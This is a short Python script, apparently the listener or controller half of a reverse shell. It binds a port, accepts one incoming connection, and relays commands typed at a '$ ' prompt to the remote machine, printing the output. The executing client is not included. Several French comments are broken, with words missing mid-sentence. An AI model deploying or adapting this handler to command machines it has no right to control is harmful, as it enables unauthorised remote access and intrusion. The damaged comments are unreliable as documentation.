# # # # # # #
# SERVER.PY #
# # # # # # #


# Import des modules
import socket, sys, time


#  d'un socket (Tunnel pour    machines)
def createSocket():
    try:
        global host
        global port
        global s
        host = ''
        port = int(input("Port: "))
        s = socket.socket()
        print("[+] Socket successfully created")
        time.sleep(1)
    except socket.error as err:
        print("[-] Socket creation failed : " + str(err))


# Bind du socket sur le port
def bindSocket():
    try:
        global port
        global s
        s.bind((host, port))
        s.listen(5)
        print("[+] Socket successfully binded")
        print("[+] Waiting for client connection ...")
        time.sleep(1)
    except socket.error as err:
        print("[-] Socket binding failed : " + str(err) + "\n Retrying...")
        bindSocket()


# Si un client se , on  la connexion et on  ses
def acceptConnection():
    conn, addr = s.accept()
    print("[+] Connection has been established")
    print("\t [+]  Client Address : " + str(addr[0]))
    print("\t [+]  Client Port : " + str(addr[1]))
    sendCommand(conn)
    conn.close()


def sendCommand(conn):
    while True:
        cmd = input("$ ")
        if cmd == "exit":
            conn.close()
            s.close()
            sys.exit()
        if (len(str.encode(cmd)) > 0):
            conn.send(str.encode(cmd))
            resp = str(conn.recv(1024), "utf-8")
            print(str(resp), end="")


def main():
    createSocket()
    bindSocket()
    acceptConnection()

main()
